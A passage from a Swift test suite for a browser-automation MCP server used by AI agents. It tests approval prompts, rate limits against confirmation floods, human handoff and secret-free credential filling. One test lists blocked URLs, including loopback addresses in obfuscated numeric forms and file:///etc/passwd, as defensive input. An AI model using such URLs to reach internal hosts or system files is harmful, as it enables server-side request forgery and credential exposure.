      + "\(ConfirmationRatePolicy.burstThreshold)"
    #expect(burst.hasSuffix(expectedTail))
  }

  @Test("A flood in one session does not starve another session's operator")
  func confirmationRateIsScopedToItsSession() async throws {
    // Two MCP clients hold two sessions. One of them being driven into a flood must not
    // refuse the other's operator, whose dialog nobody has been trained to click through.
    // Two sessions at once is what two MCP clients look like to this server.
    let registry = try WebKitSessionRegistry(maximumSessions: 2)
    let flooded = try registry.open()
    let quiet = try registry.open()
    let presenter = ConfirmationPresenterStub(
      responses: Array(repeating: false, count: ConfirmationRatePolicy.refuseThreshold + 2))
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    for index in 0..<(ConfirmationRatePolicy.refuseThreshold + 1) {
      _ = try await toolCall(
        server, id: Int64(7000 + index), name: "browser_navigate",
        arguments: [
          "session_id": .string(flooded.rawValue.uuidString),
          "url": .string("https://example.test/flood/\(index)"),
        ])
    }
    let presentedWhileFlooding = presenter.requests.count
    #expect(presentedWhileFlooding < ConfirmationRatePolicy.refuseThreshold + 1)

    let allowed = try await toolCall(
      server, id: 7100, name: "browser_navigate",
      arguments: [
        "session_id": .string(quiet.rawValue.uuidString),
        "url": .string("https://example.test/quiet"),
      ])
    #expect(allowed["error"] == nil, "a fresh session inherited another session's flood")
    #expect(presenter.requests.count == presentedWhileFlooding + 1)
    #expect(presenter.requests.last?.message.contains("in the last minute") == false)
  }

  @Test("Closing a session drops its confirmation count")
  func confirmationRateForgetsAClosedSession() async throws {
    // A handle is reusable state on the server. An operator who opened a fresh session
    // must not be refused for what the previous holder of that session did.
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let presenter = ConfirmationPresenterStub(
      responses: Array(repeating: false, count: ConfirmationRatePolicy.refuseThreshold + 2))
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    var lastError: JSONValue?
    for index in 0..<(ConfirmationRatePolicy.refuseThreshold + 1) {
      lastError = try await toolCall(
        server, id: Int64(8000 + index), name: "browser_navigate",
        arguments: [
          "session_id": .string(handle.rawValue.uuidString),
          "url": .string("https://example.test/before-close/\(index)"),
        ])["error"]
    }
    #expect(lastError != nil, "the flood was never refused")
    _ = try await toolCall(
      server, id: 8100, name: "browser_session",
      arguments: [
        "operation": .string("close"),
        "session_id": .string(handle.rawValue.uuidString),
      ])
    let reopened = try registry.open()
    let afterClose = try await toolCall(
      server, id: 8101, name: "browser_navigate",
      arguments: [
        "session_id": .string(reopened.rawValue.uuidString),
        "url": .string("https://example.test/after-close"),
      ])
    #expect(
      afterClose["error"] == nil, "a reopened session carried the closed session's count")
    #expect(
      presenter.requests.last?.message.contains("Confirmations asked for in the last minute:")
        == false,
      "a reopened session was told it was mid-burst")
  }

  @Test("Native approval and AppKit dispatch produce distinct trusted receipts")
  func nativeApprovedTrustedActuation() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      """
      <button aria-label='Create app'
        onclick="this.dataset.state=event.isTrusted ? 'trusted' : 'rejected'">Create app</button>
      """,
      baseURL: URL(string: "https://example.test/apps"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let presenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let target = try object(try array(observation["elements"]).first)
    let acted = try await toolCall(
      server, id: 2, name: "browser_act",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try string(target["elementID"])),
        "operation": .string("click"),
        "approval_mode": .string("native"),
        "idempotency_key": .string("native-create-once"),
        "postcondition": .object([
          "type": .string("attribute_equals"), "attribute": .string("data-state"),
          "value": .string("trusted"),
        ]),
      ])
    let structured = try object(try object(acted["result"])["structuredContent"])
    #expect(structured["confirmation_mode"] == .string("native"))
    #expect(structured["dispatch_mode"] == .string("native_appkit"))
    #expect(structured["confirmation_and_dispatch_are_distinct"] == .bool(true))
    #expect(structured["trusted_gesture_state"] == .string("trusted"))
    #expect(try object(structured["verification"])["verified"] != nil)
    #expect(presenter.requests.count == 1)
  }

  @Test("Navigation approval is exact-argument-bound and unsafe URL forms fail closed")
  func navigationApprovalBoundary() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let confirmationPresenter = ConfirmationPresenterStub(responses: [false])
    let server = WebKitMCPServer(
      registry: registry,
      confirmationPresenter: confirmationPresenter
    )
    let sessionID = handle.rawValue.uuidString
    let arguments: [String: JSONValue] = [
      "session_id": .string(sessionID),
      "url": .string("https://example.com/account"),
      "approval_mode": .string("mcp"),
    ]
    let prepared = try await toolCall(
      server, id: 2, name: "browser_navigate", arguments: arguments)
    let required = try object(prepared["result"])
    #expect(required["resultType"] == .string("input_required"))
    let supersededState = try string(required["requestState"])

    let preparedAgain = try await toolCall(
      server, id: 3, name: "browser_navigate", arguments: arguments)
    let requestState = try string(try object(preparedAgain["result"])["requestState"])
    let supersededAttempt = try await roundTripToolCall(
      server,
      id: 4,
      name: "browser_navigate",
      arguments: arguments,
      requestState: supersededState,
      action: "accept",
      confirm: true
    )
    #expect(try object(supersededAttempt["error"])["code"] == .int(-32602))

    var changed = arguments
    changed["url"] = .string("https://example.org/account")
    let mutationAttempt = try await call(
      server,
      id: 5,
      method: "tools/call",
      params: .object([
        "name": .string("browser_navigate"),
        "arguments": .object(changed),
        "requestState": .string(requestState),
        "inputResponses": .object([
          "confirmation": .object([
            "action": .string("accept"),
            "content": .object(["confirm": .bool(true)]),
          ])
        ]),
      ]),
      modern: true
    )
    #expect(try object(mutationAttempt["error"])["code"] == .int(-32602))

    for blockedURL in [
      "https://example.com:password@localhost/private",
      "http://127.0.0.1:8080/private",
      "http://2130706433/private",
      "http://0x7f000001/private",
      "http://service.local/private",
      "file:///etc/passwd",
    ] {
      let blocked = try await toolCall(
        server,
        id: 6,
        name: "browser_navigate",
        arguments: ["session_id": .string(sessionID), "url": .string(blockedURL)]
      )
      #expect(try object(blocked["error"])["code"] == .int(-32602))
    }

    let legacy = try await call(
      server,
      id: 7,
      method: "tools/call",
      params: .object([
        "name": .string("browser_navigate"), "arguments": .object(arguments),
      ]),
      modern: false
    )
    #expect(try object(legacy["result"])["isError"] == .bool(true))
    #expect(confirmationPresenter.requests.count == 1)
    #expect(confirmationPresenter.requests.first?.title == "Approve Web Navigation")
    #expect(
      confirmationPresenter.requests.first?.message.contains("https://example.com/account") == true)
  }

  @Test("Goal delegation is explicit, observable, revocable, and native-confirmed once")
  func goalDelegationLifecycle() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let presenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let sessionID = handle.rawValue.uuidString
    let started = try await toolCall(
      server, id: 1, name: "browser_session",
      arguments: [
        "operation": .string("goal_delegation_start"),
        "session_id": .string(sessionID),
        "goal_display": .string("Inspect account settings"),
        "origin": .string("https://example.com"),
        "path_prefixes": .array([.string("/account")]),
        "allowed_query_keys": .array([.string("tab")]),
        "duration_seconds": .int(900),
        "maximum_navigations": .int(30),
      ])
    let startResult = try object(try object(started["result"])["structuredContent"])
    #expect(startResult["state"] == .string("active"))
    #expect(startResult["goal_display_is_authority"] == .bool(false))
    #expect(startResult["remaining_navigations"] == .int(30))
    #expect(startResult["hard_stops_enforced"] == .bool(true))
    #expect(presenter.requests.count == 1)
    #expect(presenter.requests[0].title == "Delegate Browser Goal")

    let status = try await toolCall(
      server, id: 2, name: "browser_session",
      arguments: [
        "operation": .string("goal_delegation_status"),
        "session_id": .string(sessionID),
      ])
    #expect(
      try object(try object(status["result"])["structuredContent"])["state"]
        == .string("active"))
    #expect(presenter.requests.count == 1)

    let revoked = try await toolCall(
      server, id: 3, name: "browser_session",
      arguments: [
        "operation": .string("goal_delegation_revoke"),
        "session_id": .string(sessionID),
      ])
    let revokedResult = try object(try object(revoked["result"])["structuredContent"])
    #expect(revokedResult["state"] == .string("inactive"))
    #expect(revokedResult["revoked"] == .bool(true))
  }

  @Test("A sensitive destination stops delegation and returns to exact confirmation")
  func goalDelegationHardStop() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let presenter = ConfirmationPresenterStub(responses: [true, false])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let sessionID = handle.rawValue.uuidString
    _ = try await toolCall(
      server, id: 1, name: "browser_session",
      arguments: [
        "operation": .string("goal_delegation_start"),
        "session_id": .string(sessionID),
        "goal_display": .string("Inspect account settings"),
        "origin": .string("https://example.com"),
        "path_prefixes": .array([.string("/account")]),
        "allowed_query_keys": .array([]),
      ])
    let denied = try await toolCall(
      server, id: 2, name: "browser_navigate",
      arguments: [
        "session_id": .string(sessionID),
        "url": .string("https://example.com/account/newApiKey"),
      ])
    #expect(try object(denied["result"])["isError"] == .bool(true))
    #expect(presenter.requests.count == 2)
    #expect(presenter.requests[1].title == "Approve Web Navigation")

    let status = try await toolCall(
      server, id: 3, name: "browser_session",
      arguments: [
        "operation": .string("goal_delegation_status"),
        "session_id": .string(sessionID),
      ])
    #expect(
      try object(try object(status["result"])["structuredContent"])["state"]
        == .string("inactive"))
  }

  @Test("Navigation uses native exact-destination confirmation by default")
  func navigationDefaultsToNativeConfirmation() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let confirmationPresenter = ConfirmationPresenterStub(responses: [false])
    let server = WebKitMCPServer(
      registry: registry,
      confirmationPresenter: confirmationPresenter
    )
    let denied = try await toolCall(
      server,
      id: 1,
      name: "browser_navigate",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "url": .string("https://example.com/account"),
      ]
    )

    let result = try object(denied["result"])
    #expect(result["isError"] == .bool(true))
    #expect(confirmationPresenter.requests.count == 1)
    #expect(confirmationPresenter.requests.first?.title == "Approve Web Navigation")
    #expect(
      confirmationPresenter.requests.first?.message.contains("https://example.com/account")
        == true)
    #expect(confirmationPresenter.requests.first?.message.contains("\n\nDestination:\n") == true)
  }

  @Test("Legacy actuation uses one native exact-action confirmation")
  func legacyNativeActuationFallback() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      """
      <button aria-label="Save" onclick="
        const status = document.createElement('div');
        status.textContent = 'Saved by legacy fallback';
        document.body.appendChild(status);
      ">Save</button>
      """,
      baseURL: URL(string: "https://example.test/settings")
    )
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let confirmationPresenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(
      registry: registry,
      confirmationPresenter: confirmationPresenter
    )
    let observed = try await legacyToolCall(
      server,
      id: 1,
      name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)]
    )
    let observation = try object(try object(observed["result"])["structuredContent"])
    let target = try object(try array(observation["elements"]).first)
    let acted = try await legacyToolCall(
      server,
      id: 2,
      name: "browser_act",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try string(target["elementID"])),
        "operation": .string("click"),
        "idempotency_key": .string("legacy-save-once"),
        "postcondition": .object([
          "type": .string("semantic_text_appears"),
          "value": .string("Saved by legacy fallback"),
        ]),
      ]
    )
    #expect(try object(acted["result"])["structuredContent"] != nil)
    #expect(confirmationPresenter.requests.count == 1)
    #expect(confirmationPresenter.requests.first?.message.contains("legacy-save-once") == false)
    #expect(confirmationPresenter.requests.first?.message.contains("Save") == true)
  }

  @Test("Legacy handoff remains human-controlled until native resume approval")
  func legacyNativeHandoffFallback() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<button>Continue</button>",
      baseURL: URL(string: "https://example.test/login"),
      timeout: .seconds(2),
      quietWindow: .milliseconds(40)
    )
    let confirmationPresenter = ConfirmationPresenterStub(responses: [false, true])
    let server = WebKitMCPServer(
      registry: registry,
      presentHumanWindows: false,
      confirmationPresenter: confirmationPresenter
    )
    let arguments: [String: JSONValue] = [
      "operation": .string("handoff"),
      "session_id": .string(handle.rawValue.uuidString),
    ]

    let handedOff = try await legacyToolCall(
      server, id: 1, name: "browser_session", arguments: arguments)
    let handoffResult = try object(try object(handedOff["result"])["structuredContent"])
    #expect(handoffResult["control_state"] == .string("human_controlled"))

    let declined = try await legacyToolCall(
      server, id: 2, name: "browser_session", arguments: arguments)
    #expect(try object(declined["result"])["isError"] == .bool(true))
    #expect(runtime.interactionControlState() == .humanControlled)

    let resumed = try await legacyToolCall(
      server, id: 3, name: "browser_session", arguments: arguments)
    let resumedResult = try object(try object(resumed["result"])["structuredContent"])
    #expect(resumedResult["control_state"] == .string("freshly_reobserved"))
    #expect(resumedResult["observation"] != nil)
    #expect(confirmationPresenter.requests.count == 2)
  }

  @Test("Human handoff keeps control until an accepted resume and returns a fresh observation")
  func humanHandoff() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<button>Continue</button>",
      baseURL: URL(string: "https://example.test/login"),
      timeout: .seconds(2),
      quietWindow: .milliseconds(40)
    )
    let before = try await runtime.observe()
    let server = WebKitMCPServer(registry: registry)
    let arguments: [String: JSONValue] = [
      "operation": .string("handoff"), "session_id": .string(handle.rawValue.uuidString),
    ]
    let requested = try await toolCall(
      server, id: 1, name: "browser_session", arguments: arguments)
    let firstResult = try object(requested["result"])
    let firstState = try string(firstResult["requestState"])
    #expect(runtime.interactionControlState() == .humanControlled)

    let declined = try await roundTripToolCall(
      server, id: 2, name: "browser_session", arguments: arguments,
      requestState: firstState, action: "decline", confirm: nil)
    #expect(try object(declined["result"])["isError"] == .bool(true))
    #expect(runtime.interactionControlState() == .humanControlled)

    let requestedAgain = try await toolCall(
      server, id: 3, name: "browser_session", arguments: arguments)
    let secondState = try string(try object(requestedAgain["result"])["requestState"])
    let resumed = try await roundTripToolCall(
      server, id: 4, name: "browser_session", arguments: arguments,
      requestState: secondState, action: "accept", confirm: true)
    let structured = try object(try object(resumed["result"])["structuredContent"])
    let observation = try object(structured["observation"])
    #expect(structured["control_state"] == .string("freshly_reobserved"))
    #expect(try string(observation["observationID"]) != before.observationID)
  }

  @Test("Handoff resume returns a bounded observation the client can actually read")
  func handoffResumeIsBounded() async throws {
    // The human handoff is the only escape hatch when a control cannot be actuated,
    // and it returned an unbounded 500-element observation — ~289 000 characters on a
    // real console page, past the client's limit. An escape hatch that cannot be read
    // is not an escape hatch.
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    let buttons = (0..<400)
      .map { "<button aria-label='Control \($0) with a deliberately long accessible name'>" }
      .joined()
    _ = try await runtime.loadHTML(
      "<title>Wide form</title>" + buttons,
      baseURL: URL(string: "https://example.test/handoff-bounds"),
      timeout: .seconds(4), quietWindow: .milliseconds(40))
    let server = WebKitMCPServer(
      registry: registry, presentHumanWindows: false,
      confirmationPresenter: ConfirmationPresenterStub(responses: []))
    let sessionID = handle.rawValue.uuidString

    let started = try await toolCall(
      server, id: 1, name: "browser_session",
      arguments: ["operation": .string("handoff_start"), "session_id": .string(sessionID)])
    let token = try string(
      try object(try object(started["result"])["structuredContent"])["resume_token"])
    try runtime.markHumanStepCompleted()

    let resumed = try await toolCall(
      server, id: 2, name: "browser_session",
      arguments: [
        "operation": .string("handoff_resume"), "session_id": .string(sessionID),
        "resume_token": .string(token),
      ])
    let structured = try object(try object(resumed["result"])["structuredContent"])
    #expect(structured["resumed"] == .bool(true))
    guard case .array(let elements) = try object(structured["observation"])["elements"] else {
      Issue.record("the resumed observation carried no element rows")
      return
    }
    #expect(elements.count <= 150)
    let encoded =
      String(
        data: try JSONEncoder().encode(JSONValue.object(structured)), encoding: .utf8) ?? ""
    #expect(
      encoded.count < 100_000,
      "the resume payload is \(encoded.count) characters, which the client cannot read")
  }

  @Test("A caller can still ask handoff resume for the full observation")
  func handoffResumeStillOffersTheFullObservation() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<title>Small form</title><button aria-label='Continue'>",
      baseURL: URL(string: "https://example.test/handoff-full"),
      timeout: .seconds(2), quietWindow: .milliseconds(40))
    let server = WebKitMCPServer(
      registry: registry, presentHumanWindows: false,
      confirmationPresenter: ConfirmationPresenterStub(responses: []))
    let sessionID = handle.rawValue.uuidString

    let started = try await toolCall(
      server, id: 1, name: "browser_session",
      arguments: ["operation": .string("handoff_start"), "session_id": .string(sessionID)])
    let token = try string(
      try object(try object(started["result"])["structuredContent"])["resume_token"])
    try runtime.markHumanStepCompleted()

    let resumed = try await toolCall(
      server, id: 2, name: "browser_session",
      arguments: [
        "operation": .string("handoff_resume"), "session_id": .string(sessionID),
        "resume_token": .string(token), "compact": .bool(false),
      ])
    let structured = try object(try object(resumed["result"])["structuredContent"])
    #expect(structured["observation_compact"] == .bool(false))
    let observation = try object(structured["observation"])
    // The full payload carries fields the compact rows drop.
    #expect(observation["elements"] != nil)
    #expect(observation["hydration"] != nil || observation["readyState"] != nil)
  }

  @Test("The host lease names the client that took it, from its own handshake")
  func hostLeaseNamesTheClient() async throws {
    // Reported from the Play campaign: the holder came back as "unknown-client" with a
    // null version, so the only way to learn who was blocking the machine was to leave
    // the MCP and run ps. An agent without a shell cannot do that, and the difference
    // matters: another session working is something to wait for, an orphan is something
    // to recover. The classic initialize carries clientInfo in params, which is what
    // real clients send and what this server was ignoring.
    let registry = try WebKitSessionRegistry()
    let server = WebKitMCPServer(
      registry: registry, presentHumanWindows: false,
      confirmationPresenter: ConfirmationPresenterStub(responses: []))

    _ = try await call(
      server, id: 1, method: "initialize",
      params: .object([
        "protocolVersion": .string("2025-11-25"),
        "capabilities": .object([:]),
        "clientInfo": .object([
          "name": .string("claude-code"), "version": .string("2.1.7"),
        ]),
      ]),
      modern: false)

    let opened = try await legacyToolCall(
      server, id: 2, name: "browser_session",
      arguments: ["operation": .string("open"), "profile_id": .string("default")])
    let sessionID = try string(
      try object(try object(opened["result"])["structuredContent"])["session_id"])

    let status = try await legacyToolCall(
      server, id: 3, name: "browser_session",
      arguments: ["operation": .string("status"), "session_id": .string(sessionID)])
    let structured = try object(try object(status["result"])["structuredContent"])
    let holder = try object(structured["holder"])
    #expect(holder["client_name"] == .string("claude-code"))
    #expect(holder["client_version"] == .string("2.1.7"))
  }

  @Test("Non-blocking handoff survives a transport reconnect and consumes its token once")
  func nonBlockingHandoffLifecycle() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<button>Continue</button>", baseURL: URL(string: "https://example.test/handoff"),
      timeout: .seconds(2), quietWindow: .milliseconds(40))
    let presenter = ConfirmationPresenterStub(responses: [])
    let server = WebKitMCPServer(
      registry: registry, presentHumanWindows: false, confirmationPresenter: presenter)
    let sessionID = handle.rawValue.uuidString

    let started = try await toolCall(
      server, id: 1, name: "browser_session",
      arguments: ["operation": .string("handoff_start"), "session_id": .string(sessionID)])
    let start = try object(try object(started["result"])["structuredContent"])
    let token = try string(start["resume_token"])
    #expect(start["blocking"] == .bool(false))
    #expect(start["control_state"] == .string("human_controlled"))

    // Aqua creates a fresh server for each socket connection. The capability
    // must remain attached to the shared host-owned registry across that edge.
    await server.prepareForClientReconnect()
    let reconnectedServer = WebKitMCPServer(
      registry: registry, presentHumanWindows: false, confirmationPresenter: presenter)

    let polled = try await toolCall(
      reconnectedServer, id: 2, name: "browser_session",
      arguments: [
        "operation": .string("handoff_status"), "session_id": .string(sessionID),
        "resume_token": .string(token),
      ])
    let poll = try object(try object(polled["result"])["structuredContent"])
    #expect(poll["resume_token_state"] == .string("active"))
    #expect(poll["ready_for_resume_request"] == .bool(false))
    #expect(poll["human_step_completed"] == .bool(false))

    let declined = try await toolCall(
      reconnectedServer, id: 3, name: "browser_session",
      arguments: [
        "operation": .string("handoff_resume"), "session_id": .string(sessionID),
        "resume_token": .string(token),
      ])
    let declinedState = try object(try object(declined["result"])["structuredContent"])
    #expect(declinedState["resumed"] == .bool(false))
    #expect(declinedState["resume_token_state"] == .string("active"))

    try runtime.markHumanStepCompleted()
    let completed = try await toolCall(
      reconnectedServer, id: 4, name: "browser_session",
      arguments: [
        "operation": .string("handoff_status"), "session_id": .string(sessionID),
        "resume_token": .string(token),
      ])
    let completedState = try object(try object(completed["result"])["structuredContent"])
    #expect(completedState["human_step_completed"] == .bool(true))
    #expect(completedState["ready_for_resume_request"] == .bool(true))

    // A client can correct an invalid observation option without losing the
    // human-completed handoff. Only a valid resume request consumes the token.
    for (offset, option) in [
      ["compact": JSONValue.string("invalid")],
      ["maximum_elements": JSONValue.int(0)],
      ["maximum_elements": JSONValue.int(2_001)],
    ].enumerated() {
      var arguments: [String: JSONValue] = [
        "operation": .string("handoff_resume"), "session_id": .string(sessionID),
        "resume_token": .string(token),
      ]
      arguments.merge(option) { _, new in new }
      let invalid = try await toolCall(
        reconnectedServer, id: Int64(40 + offset), name: "browser_session", arguments: arguments)
      #expect(try object(invalid["error"])["code"] == .int(-32602))
      #expect(registry.handoffResumeCapabilityIsActive(token, for: handle))
      #expect(runtime.interactionControlState() == .humanStepCompleted)
    }

    let resumed = try await toolCall(
      reconnectedServer, id: 5, name: "browser_session",
      arguments: [
        "operation": .string("handoff_resume"), "session_id": .string(sessionID),
        "resume_token": .string(token),
      ])
    let resumedState = try object(try object(resumed["result"])["structuredContent"])
    #expect(resumedState["resumed"] == .bool(true))
    #expect(resumedState["resume_token_state"] == .string("consumed"))
    #expect(resumedState["control_state"] == .string("freshly_reobserved"))
    #expect(resumedState["observation"] != nil)

    let replay = try await toolCall(
      reconnectedServer, id: 6, name: "browser_session",
      arguments: [
        "operation": .string("handoff_resume"), "session_id": .string(sessionID),
        "resume_token": .string(token),
      ])
    #expect(try object(replay["error"])["code"] == .int(-32602))
    #expect(presenter.requests.isEmpty)
  }

  @Test("Authentication keeps the asynchronous handoff token active until the human leaves")
  func authenticationHandoffDoesNotConsumeResumeToken() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<title>Apple ID</title><form><input autocomplete='username'></form>",
      baseURL: URL(string: "https://idmsa.apple.com/IDMSWebAuth/signin?state=private")!,
      timeout: .seconds(2), quietWindow: .milliseconds(40))
    let presenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(
      registry: registry, presentHumanWindows: false, confirmationPresenter: presenter)
    let sessionID = handle.rawValue.uuidString

    let started = try await toolCall(
      server, id: 1, name: "browser_session",
      arguments: ["operation": .string("handoff_start"), "session_id": .string(sessionID)])
    let token = try string(
      try object(try object(started["result"])["structuredContent"])["resume_token"])

    let blocked = try await toolCall(
      server, id: 2, name: "browser_session",
      arguments: [
        "operation": .string("handoff_resume"), "session_id": .string(sessionID),
        "resume_token": .string(token),
      ])
    let blockedState = try object(try object(blocked["result"])["structuredContent"])
    #expect(blockedState["status"] == .string("authentication_origin_requires_human_handoff"))
    #expect(blockedState["origin"] == .string("https://idmsa.apple.com"))
    #expect(blockedState["resumed"] == .bool(false))
    #expect(blockedState["resume_token_state"] == .string("active"))
    #expect(runtime.interactionControlState() == .humanControlled)
    #expect(presenter.requests.isEmpty)

    let polled = try await toolCall(
      server, id: 3, name: "browser_session",
      arguments: [
        "operation": .string("handoff_status"), "session_id": .string(sessionID),
        "resume_token": .string(token),
      ])
    #expect(
      try object(try object(polled["result"])["structuredContent"])["resume_token_state"]
        == .string("active"))
  }

  @Test("The SiliconPass MCP shim is secretless and never submits")
  func siliconPassShim() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      """
      <form>
        <label for='username'>Username</label><input id='username'>
        <label for='password'>Password</label><input id='password' type='password'>
        <button type='submit'>Sign in</button>
      </form>
      <script>
        globalThis.submitCount = 0;
        document.querySelector('form').addEventListener('submit', event => {
          globalThis.submitCount += 1; event.preventDefault();
        });
      </script>
      """,
      baseURL: URL(string: "https://fixture.invalid/login"),
      timeout: .seconds(2),
      quietWindow: .milliseconds(40)
    )
    let server = WebKitMCPServer(
      registry: registry,
      credentialBroker: InProcessSyntheticBrokerStub()
    )
    let observed = try await toolCall(
      server,
      id: 1,
      name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)]
    )
    let structured = try object(try object(observed["result"])["structuredContent"])
    let observationID = try string(structured["observationID"])
    let filled = try await toolCall(
      server,
      id: 2,
      name: "browser_fill_siliconpass",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(observationID),
        "username_element_id": .string("e1"),
        "password_element_id": .string("e2"),
      ]
    )
    let result = try object(filled["result"])
    #expect(try object(result["structuredContent"])["status"] == .string("filled"))

    let wire = String(decoding: try JSONEncoder().encode(JSONValue.object(filled)), as: UTF8.self)
    #expect(!wire.contains(InProcessSyntheticBrokerStub.username))
    #expect(!wire.contains(InProcessSyntheticBrokerStub.password))
    let page = try #require(
      await runtime.webView.evaluateJavaScript(
        "JSON.stringify([username.value,password.value,globalThis.submitCount])") as? String
    )
    #expect(
      page
        == "[\"\(InProcessSyntheticBrokerStub.username)\",\"\(InProcessSyntheticBrokerStub.password)\",0]"
    )
  }

  @Test("The SiliconPass rotation tool is secretless and never commits the form")
  func siliconPassRotationShim() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      """
      <form>
        <input id='current' type='password' autocomplete='current-password'>
        <input id='next' type='password' autocomplete='new-password'>
        <input id='confirmation' type='password' autocomplete='new-password'>
        <button type='submit'>Change</button>
      </form>
      <script>
        globalThis.submitCount = 0;
        document.querySelector('form').addEventListener('submit', event => {
          globalThis.submitCount += 1; event.preventDefault();
        });
      </script>
      """,
      baseURL: URL(string: "https://fixture.invalid/settings/password"),
      timeout: .seconds(2),
      quietWindow: .milliseconds(40)
    )
    let server = WebKitMCPServer(
      registry: registry,
      credentialBroker: InProcessSyntheticBrokerStub()
    )
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)]
    )
    let observation = try object(try object(observed["result"])["structuredContent"])
    let response = try await toolCall(
      server, id: 2, name: "browser_rotate_siliconpass_password",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(try string(observation["observationID"])),
        "current_password_element_id": .string("e1"),
        "new_password_element_id": .string("e2"),
        "confirmation_element_id": .string("e3"),
      ]
    )
    let structured = try object(try object(response["result"])["structuredContent"])
    #expect(structured["status"] == .string("changed"))
    #expect(structured["secret_released_to_mcp"] == .bool(false))
    #expect(structured["submitted"] == .bool(false))
    let wire = String(decoding: try JSONEncoder().encode(response), as: UTF8.self)
    #expect(!wire.contains(InProcessSyntheticBrokerStub.password))
    #expect(!wire.contains(InProcessSyntheticBrokerStub.rotatedPassword))
    let page = try #require(
      await runtime.webView.evaluateJavaScript(
        "JSON.stringify([current.value,next.value,confirmation.value,globalThis.submitCount])"
      ) as? String
    )
    #expect(
      page
        == "[\"\(InProcessSyntheticBrokerStub.password)\",\"\(InProcessSyntheticBrokerStub.rotatedPassword)\",\"\(InProcessSyntheticBrokerStub.rotatedPassword)\",0]"
    )
  }

  @Test("A missing SiliconPass credential requests only a human handoff")
  func siliconPassCredentialNotFound() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      """
      <label for='username'>Username</label><input id='username'>
      <label for='password'>Password</label><input id='password' type='password'>
      """,
      baseURL: URL(string: "https://fixture.invalid/login"),
      timeout: .seconds(2),
      quietWindow: .milliseconds(40)
    )
    let server = WebKitMCPServer(
      registry: registry,
      presentHumanWindows: false,
      credentialBroker: FixedStatusCredentialBrokerStub(status: .credentialNotFound),
      confirmationPresenter: ConfirmationPresenterStub(responses: [true])
    )
    let observed = try await toolCall(
      server,
      id: 1,
      name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)]
    )
    let observation = try object(try object(observed["result"])["structuredContent"])
    let response = try await toolCall(
      server,
      id: 2,
      name: "browser_fill_siliconpass",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(try string(observation["observationID"])),
        "username_element_id": .string("e1"),
        "password_element_id": .string("e2"),
      ]
    )
    let result = try object(try object(response["result"])["structuredContent"])
    #expect(result["status"] == .string("credential_not_found"))
    #expect(result["add_offered"] == .bool(true))
    #expect(result["human_handoff_started"] == .bool(true))
    #expect(result["control_state"] == .string("human_controlled"))
    let fieldValues =
      try await runtime.webView.evaluateJavaScript(
        "JSON.stringify([username.value,password.value])") as? String
    #expect(fieldValues == "[\"\",\"\"]")
  }

  @Test("Unavailable Mac user presence returns explicit retry guidance")
  func siliconPassUserPresenceUnavailable() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      """
      <form>
        <input id='username' autocomplete='username'>
        <input id='password' type='password' autocomplete='current-password'>
      </form>
      """,
      baseURL: URL(string: "https://fixture.invalid/login"),
